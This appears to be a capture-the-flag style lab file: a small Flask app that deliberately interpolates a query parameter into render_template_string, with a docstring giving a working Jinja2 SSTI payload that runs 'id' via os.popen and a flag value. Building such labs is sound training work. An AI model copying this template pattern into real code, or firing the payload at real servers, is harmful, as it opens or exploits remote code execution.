"""
RCE Lab 9: Server-Side Template Injection (SSTI) RCE
Difficulty: 3 (Advanced)
Points: 100

Description:
Remote Code Execution through advanced SSTI techniques.
"""

from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    """
    VULNERABLE: Template injection with full code access
    
    Attack Vector:
    /?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
    /?name={% for c in [].__class__.__base__.__subclasses__() %}...
    
    Flag: FLAG{rce_ssti_009}
    """
    name = request.args.get('name', 'Guest')
    msg = None
    
    try:
        # VULNERABLE: Direct template rendering with access to dangerous functions
        template = f"""
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Hello {{{{ {name} }}}}</h1>
            <p>Server SSTI vulnerable endpoint</p>
        </body>
        </html>
        """
        msg = render_template_string(template)
    except Exception as e:
        msg = f"<p>Error: {str(e)}</p>"
    
    return msg

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5009, debug=False)
